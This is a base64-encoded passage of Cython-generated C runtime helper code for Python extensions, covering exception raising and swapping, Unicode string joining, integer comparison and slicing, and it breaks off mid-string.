bnN0YW5jZV9DaGVjayh2YWx1ZSkpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2FsbGluZyAlUiBzaG91bGQgaGF2ZSByZXR1cm5lZCBhbiBpbnN0YW5jZSBvZiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uLCBub3QgJVIiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlLCBQeV9UWVBFKHZhbHVlKSk7XG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgInJhaXNlOiBleGNlcHRpb24gY2xhc3MgbXVzdCBiZSBhIHN1YmNsYXNzIG9mIEJhc2VFeGNlcHRpb24iKTtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIGlmIChjYXVzZSkge1xuICAgICAgICBQeU9iamVjdCAqZml4ZWRfY2F1c2U7XG4gICAgICAgIGlmIChjYXVzZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgICAgICBmaXhlZF9jYXVzZSA9IE5VTEw7XG4gICAgICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25DbGFzc19DaGVjayhjYXVzZSkpIHtcbiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gUHlPYmplY3RfQ2FsbE9iamVjdChjYXVzZSwgTlVMTCk7XG4gICAgICAgICAgICBpZiAoZml4ZWRfY2F1c2UgPT0gTlVMTClcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKGNhdXNlKSkge1xuICAgICAgICAgICAgZml4ZWRfY2F1c2UgPSBjYXVzZTtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihmaXhlZF9jYXVzZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJleGNlcHRpb24gY2F1c2VzIG11c3QgZGVyaXZlIGZyb20gIlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uIik7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZSh2YWx1ZSwgZml4ZWRfY2F1c2UpO1xuICAgIH1cbiAgICBQeUVycl9TZXRPYmplY3QodHlwZSwgdmFsdWUpO1xuICAgIGlmICh0Yikge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICAgICAgUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKHZhbHVlLCB0Yik7XG4jZWxpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICAgICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuICAgICAgICBQeU9iamVjdCogdG1wX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrO1xuICAgICAgICBpZiAodGIgIT0gdG1wX3RiKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYodGIpO1xuICAgICAgICAgICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gdGI7XG4gICAgICAgICAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgICAgICAgUHlFcnJfRmV0Y2goJnRtcF90eXBlLCAmdG1wX3ZhbHVlLCAmdG1wX3RiKTtcbiAgICAgICAgUHlfSU5DUkVGKHRiKTtcbiAgICAgICAgUHlFcnJfUmVzdG9yZSh0bXBfdHlwZSwgdG1wX3ZhbHVlLCB0Yik7XG4gICAgICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiNlbmRpZlxuICAgIH1cbmJhZDpcbiAgICBQeV9YREVDUkVGKG93bmVkX2luc3RhbmNlKTtcbiAgICByZXR1cm47XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKFB5T2JqZWN0ICpvYmopIHtcbiAgICBpZiAodW5saWtlbHkob2JqID09IFB5X05vbmUpKVxuICAgICAgICBvYmogPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vbmU7XG4gICAgcmV0dXJuIF9fUHl4X05ld1JlZihvYmopO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0pvaW4oUHlPYmplY3QqKiB2YWx1ZXMsIFB5X3NzaXplX3QgdmFsdWVfY291bnQsIFB5X3NzaXplX3QgcmVzdWx0X3VsZW5ndGgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X1VDUzQgbWF4X2NoYXIpIHtcbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlPYmplY3QgKnJlc3VsdF91dmFsO1xuICAgIGludCByZXN1bHRfdWtpbmQsIGtpbmRfc2hpZnQ7XG4gICAgUHlfc3NpemVfdCBpLCBjaGFyX3BvcztcbiAgICB2b2lkICpyZXN1bHRfdWRhdGE7XG4gICAgaWYgKG1heF9jaGFyID4gMTExNDExMSkgbWF4X2NoYXIgPSAxMTE0MTExO1xuICAgIHJlc3VsdF91dmFsID0gUHlVbmljb2RlX05ldyhyZXN1bHRfdWxlbmd0aCwgbWF4X2NoYXIpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0X3V2YWwpKSByZXR1cm4gTlVMTDtcbiAgICByZXN1bHRfdWtpbmQgPSAobWF4X2NoYXIgPD0gMjU1KSA/IFB5VW5pY29kZV8xQllURV9LSU5EIDogKG1heF9jaGFyIDw9IDY1NTM1KSA/IFB5VW5pY29kZV8yQllURV9LSU5EIDogUHlVbmljb2RlXzRCWVRFX0tJTkQ7XG4gICAga2luZF9zaGlmdCA9IChyZXN1bHRfdWtpbmQgPT0gUHlVbmljb2RlXzRCWVRFX0tJTkQpID8gMiA6IHJlc3VsdF91a2luZCAtIDE7XG4gICAgcmVzdWx0X3VkYXRhID0gUHlVbmljb2RlX0RBVEEocmVzdWx0X3V2YWwpO1xuICAgIGFzc2VydChraW5kX3NoaWZ0ID09IDIgfHwga2luZF9zaGlmdCA9PSAxIHx8IGtpbmRfc2hpZnQgPT0gMCk7XG4gICAgaWYgKHVubGlrZWx5KChQWV9TU0laRV9UX01BWCA+PiBraW5kX3NoaWZ0KSAtIHJlc3VsdF91bGVuZ3RoIDwgMCkpXG4gICAgICAgIGdvdG8gb3ZlcmZsb3c7XG4gICAgY2hhcl9wb3MgPSAwO1xuICAgIGZvciAoaT0wOyBpIDwgdmFsdWVfY291bnQ7IGkrKykge1xuICAgICAgICBpbnQgdWtpbmQ7XG4gICAgICAgIFB5X3NzaXplX3QgdWxlbmd0aDtcbiAgICAgICAgdm9pZCAqdWRhdGE7XG4gICAgICAgIFB5T2JqZWN0ICp1dmFsID0gdmFsdWVzW2ldO1xuICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEWSh1dmFsKSA9PSAoLTEpKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICB1bGVuZ3RoID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgodXZhbCk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KHVsZW5ndGggPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoIXVsZW5ndGgpKVxuICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgIGlmICh1bmxpa2VseSgoUFlfU1NJWkVfVF9NQVggPj4ga2luZF9zaGlmdCkgLSB1bGVuZ3RoIDwgY2hhcl9wb3MpKVxuICAgICAgICAgICAgZ290byBvdmVyZmxvdztcbiAgICAgICAgdWtpbmQgPSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1dmFsKTtcbiAgICAgICAgdWRhdGEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1dmFsKTtcbiAgICAgICAgaWYgKHVraW5kID09IHJlc3VsdF91a2luZCkge1xuICAgICAgICAgICAgbWVtY3B5KChjaGFyICopcmVzdWx0X3VkYXRhICsgKGNoYXJfcG9zIDw8IGtpbmRfc2hpZnQpLCB1ZGF0YSwgKHNpemVfdCkgKHVsZW5ndGggPDwga2luZF9zaGlmdCkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKSA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeVVuaWNvZGVfRmFzdENvcHlDaGFyYWN0ZXJzKVxuICAgICAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKTtcbiAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICBQeV9zc2l6ZV90IGo7XG4gICAgICAgICAgICBmb3IgKGo9MDsgaiA8IHVsZW5ndGg7IGorKykge1xuICAgICAgICAgICAgICAgIFB5X1VDUzQgdWNoYXIgPSBfX1B5eF9QeVVuaWNvZGVfUkVBRCh1a2luZCwgdWRhdGEsIGopO1xuICAgICAgICAgICAgICAgIF9fUHl4X1B5VW5pY29kZV9XUklURShyZXN1bHRfdWtpbmQsIHJlc3VsdF91ZGF0YSwgY2hhcl9wb3MraiwgdWNoYXIpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgIH1cbiAgICAgICAgY2hhcl9wb3MgKz0gdWxlbmd0aDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdF91dmFsO1xub3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJqb2luKCkgcmVzdWx0IGlzIHRvbyBsb25nIGZvciBhIFB5dGhvbiBzdHJpbmciKTtcbmJhZDpcbiAgICBQeV9ERUNSRUYocmVzdWx0X3V2YWwpO1xuICAgIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeV9zc2l6ZV90IGk7XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7XG4gICAgUHlPYmplY3QgKnZhbHVlX3R1cGxlID0gUHlUdXBsZV9OZXcodmFsdWVfY291bnQpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWVfdHVwbGUpKSByZXR1cm4gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihtYXhfY2hhcik7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIocmVzdWx0X3VsZW5ndGgpO1xuICAgIGZvciAoaT0wOyBpPHZhbHVlX2NvdW50OyBpKyspIHtcbiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFsdWVfdHVwbGUsIGksIHZhbHVlc1tpXSkgIT0gKDApKSBnb3RvIGJhZDtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlc1tpXSk7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUsIHZhbHVlX3R1cGxlKTtcbmJhZDpcbiAgICBQeV9ERUNSRUYodmFsdWVfdHVwbGUpO1xuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0Jvb2xOZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGxvbmcgaW5wbGFjZSkge1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGludHZhbCk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoaW5wbGFjZSk7XG4gICAgaWYgKG9wMSA9PSBvcDIpIHtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7XG4gICAgICAgIGludCB1bmVxdWFsO1xuICAgICAgICB1bnNpZ25lZCBsb25nIHVpbnR2YWw7XG4gICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KG9wMSk7XG4gICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKG9wMSk7XG4gICAgICAgIGlmIChpbnR2YWwgPT0gMCkge1xuICAgICAgICAgICAgcmV0dXJuIChfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkgIT0gMSk7XG4gICAgICAgIH0gZWxzZSBpZiAoaW50dmFsIDwgMCkge1xuICAgICAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc05vbk5lZyhvcDEpKVxuICAgICAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICAgICAgaW50dmFsID0gLWludHZhbDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNOZWcob3AxKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICB1aW50dmFsID0gKHVuc2lnbmVkIGxvbmcpIGludHZhbDtcbiNpZiBQeUxvbmdfU0hJRlQgKiA0IDwgU0laRU9GX0xPTkcqOFxuICAgICAgICBpZiAodWludHZhbCA+PiAoUHlMb25nX1NISUZUICogNCkpIHtcbiAgICAgICAgICAgIHVuZXF1YWwgPSAoc2l6ZSAhPSA1KSB8fCAoZGlnaXRzWzBdICE9ICh1aW50dmFsICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSlcbiAgICAgICAgICAgICAgICAgfCAoZGlnaXRzWzFdICE9ICgodWludHZhbCA+PiAoMSAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkgfCAoZGlnaXRzWzJdICE9ICgodWludHZhbCA+PiAoMiAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkgfCAoZGlnaXRzWzNdICE9ICgodWludHZhbCA+PiAoMyAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkgfCAoZGlnaXRzWzRdICE9ICgodWludHZhbCA+PiAoNCAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSk7XG4gICAgICAgIH0gZWxzZVxuI2VuZGlmXG4jaWYgUHlMb25nX1NISUZUICogMyA8IFNJWkVPRl9MT05HKjhcbiAgICAgICAgaWYgKHVpbnR2YWwgPj4gKFB5TG9uZ19TSElGVCAqIDMpKSB7XG4gICAgICAgICAgICB1bmVxdWFsID0gKHNpemUgIT0gNCkgfHwgKGRpZ2l0c1swXSAhPSAodWludHZhbCAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpXG4gICAgICAgICAgICAgICAgIHwgKGRpZ2l0c1sxXSAhPSAoKHVpbnR2YWwgPj4gKDEgKiBQeUxvbmdfU0hJRlQpKSAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpIHwgKGRpZ2l0c1syXSAhPSAoKHVpbnR2YWwgPj4gKDIgKiBQeUxvbmdfU0hJRlQpKSAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpIHwgKGRpZ2l0c1szXSAhPSAoKHVpbnR2YWwgPj4gKDMgKiBQeUxvbmdfU0hJRlQpKSAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpO1xuICAgICAgICB9IGVsc2VcbiNlbmRpZlxuI2lmIFB5TG9uZ19TSElGVCAqIDIgPCBTSVpFT0ZfTE9ORyo4XG4gICAgICAgIGlmICh1aW50dmFsID4+IChQeUxvbmdfU0hJRlQgKiAyKSkge1xuICAgICAgICAgICAgdW5lcXVhbCA9IChzaXplICE9IDMpIHx8IChkaWdpdHNbMF0gIT0gKHVpbnR2YWwgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKVxuICAgICAgICAgICAgICAgICB8IChkaWdpdHNbMV0gIT0gKCh1aW50dmFsID4+ICgxICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKSB8IChkaWdpdHNbMl0gIT0gKCh1aW50dmFsID4+ICgyICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKTtcbiAgICAgICAgfSBlbHNlXG4jZW5kaWZcbiNpZiBQeUxvbmdfU0hJRlQgKiAxIDwgU0laRU9GX0xPTkcqOFxuICAgICAgICBpZiAodWludHZhbCA+PiAoUHlMb25nX1NISUZUICogMSkpIHtcbiAgICAgICAgICAgIHVuZXF1YWwgPSAoc2l6ZSAhPSAyKSB8fCAoZGlnaXRzWzBdICE9ICh1aW50dmFsICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSlcbiAgICAgICAgICAgICAgICAgfCAoZGlnaXRzWzFdICE9ICgodWludHZhbCA+PiAoMSAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSk7XG4gICAgICAgIH0gZWxzZVxuI2VuZGlmXG4gICAgICAgICAgICB1bmVxdWFsID0gKHNpemUgIT0gMSkgfHwgKCgodW5zaWduZWQgbG9uZykgZGlnaXRzWzBdKSAhPSAodWludHZhbCAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpO1xuICAgICAgICByZXR1cm4gKHVuZXF1YWwgIT0gMCk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIGlmIChQeUZsb2F0X0NoZWNrRXhhY3Qob3AxKSkge1xuICAgICAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7XG4gICAgICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUob3AxKTtcbiAgICAgICAgcmV0dXJuICgoZG91YmxlKWEgIT0gKGRvdWJsZSliKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihcbiAgICAgICAgUHlPYmplY3RfUmljaENvbXBhcmUob3AxLCBvcDIsIFB5X05FKSk7XG59XG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7XG4gICAgaWYgKHRtcF92YWx1ZSA9PSBOVUxMIHx8IHRtcF92YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDtcbiAgICAgICAgdG1wX3R5cGUgPSBOVUxMO1xuICAgICAgICB0bXBfdGIgPSBOVUxMO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHRtcF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRSh0bXBfdmFsdWUpO1xuICAgICAgICBQeV9JTkNSRUYodG1wX3R5cGUpO1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIHRtcF90YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdG1wX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICBQeV9YSU5DUkVGKHRtcF90Yik7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHRtcF90YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayh0bXBfdmFsdWUpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4gICNlbGlmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gKnRiO1xuICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9ICp0eXBlO1xuICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjtcbiAgI2VuZGlmXG4gICAgKnR5cGUgPSB0bXBfdHlwZTtcbiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7XG4gICAgKnRiID0gdG1wX3RiO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXhjZXB0aW9uU3dhcChQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpO1xuICAgIFB5RXJyX1NldEV4Y0luZm8oKnR5cGUsICp2YWx1ZSwgKnRiKTtcbiAgICAqdHlwZSA9IHRtcF90eXBlO1xuICAgICp2YWx1ZSA9IHRtcF92YWx1ZTtcbiAgICAqdGIgPSB0bXBfdGI7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpIHtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVmFsdWVFcnJvcixcbiAgICAgICAgICAgICAgICAgInRvbyBtYW55IHZhbHVlcyB0byB1bnBhY2sgKGV4cGVjdGVkICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCkiLCBleHBlY3RlZCk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCkge1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19WYWx1ZUVycm9yLFxuICAgICAgICAgICAgICAgICAibmVlZCBtb3JlIHRoYW4gJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIHZhbHVlJS4xcyB0byB1bnBhY2siLFxuICAgICAgICAgICAgICAgICBpbmRleCwgKGluZGV4ID09IDEpID8gIiIgOiAicyIpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9JdGVyRmluaXNoKHZvaWQpIHtcbiAgICBQeU9iamVjdCogZXhjX3R5cGU7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBleGNfdHlwZSA9IF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCk7XG4gICAgaWYgKHVubGlrZWx5KGV4Y190eXBlKSkge1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKFB5T2JqZWN0ICpyZXR2YWwsIFB5X3NzaXplX3QgZXhwZWN0ZWQpIHtcbiAgICBpZiAodW5saWtlbHkocmV0dmFsKSkge1xuICAgICAgICBQeV9ERUNSRUYocmV0dmFsKTtcbiAgICAgICAgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoZXhwZWN0ZWQpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9JdGVyRmluaXNoKCk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKFB5T2JqZWN0KiBvYmosXG4gICAgICAgIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLFxuICAgICAgICBQeU9iamVjdCoqIF9weV9zdGFydCwgUHlPYmplY3QqKiBfcHlfc3RvcCwgUHlPYmplY3QqKiBfcHlfc2xpY2UsXG4gICAgICAgIGludCBoYXNfY3N0YXJ0LCBpbnQgaGFzX2NzdG9wLCBDWVRIT05fVU5VU0VEIGludCB3cmFwYXJvdW5kKSB7XG4gICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICBQeU1hcHBpbmdNZXRob2RzKiBtcCA9IFB5X1RZUEUob2JqKS0+dHBfYXNfbWFwcGluZztcbiAgICBpZiAobGlrZWx5KG1wICYmIG1wLT5tcF9zdWJzY3JpcHQpKVxuI2VuZGlmXG4gICAge1xuICAgICAgICBQeU9iamVjdCogcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqcHlfc2xpY2UsICpweV9zdGFydCwgKnB5X3N0b3A7XG4gICAgICAgIGlmIChfcHlfc2xpY2UpIHtcbiAgICAgICAgICAgIHB5X3NsaWNlID0gKl9weV9zbGljZTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBvd25lZF9zdGFydCA9IE5VTEw7XG4gICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RvcCA9IE5VTEw7XG4gICAgICAgICAgICBpZiAoX3B5X3N0YXJ0KSB7XG4gICAgICAgICAgICAgICAgcHlfc3RhcnQgPSAqX3B5X3N0YXJ0O1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdGFydCkge1xuICAgICAgICAgICAgICAgICAgICBvd25lZF9zdGFydCA9IHB5X3N0YXJ0ID0gUHlMb25nX0Zyb21Tc2l6ZV90KGNzdGFydCk7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhcnQpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2VcbiAgIC